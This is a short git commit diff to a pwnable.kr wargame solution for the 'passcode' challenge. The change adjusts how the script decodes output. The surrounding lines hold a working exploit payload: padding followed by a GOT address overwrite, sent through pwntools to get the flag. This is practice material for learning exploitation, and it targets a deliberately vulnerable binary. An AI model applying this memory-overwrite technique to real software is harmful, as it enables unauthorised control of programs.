207c31e9ae43f5998ada3f86e2c92dc642193468
DailyLinux <baksa1849@gmail.com>
2021-03-07 06:41:47 +0900

    Added decode option to print recvall()

--- pwnable.kr/Toddler's Bottle/passcode/passcode.py
+++ pwnable.kr/Toddler's Bottle/passcode/passcode.py
@@ -6,7 +6,11 @@ payload = b"A" * 96 + p32(0x804a004) + b'\n' + b'134514147'
 
 process = shell.process(executable='./passcode', argv=['passcode'])
 process.sendline(payload)
-print(process.recvall().decode('utf-8', 'ignore'))
+
+# Any of three is all ok to get flag
+#print(process.recvall().decode('utf-8', 'backslashreplace'))
+#print(process.recvall().decode('utf-8', 'ignore'))
+print(process.recvall().decode('utf-8', 'replace'))
 
 process.close()
 shell.close()
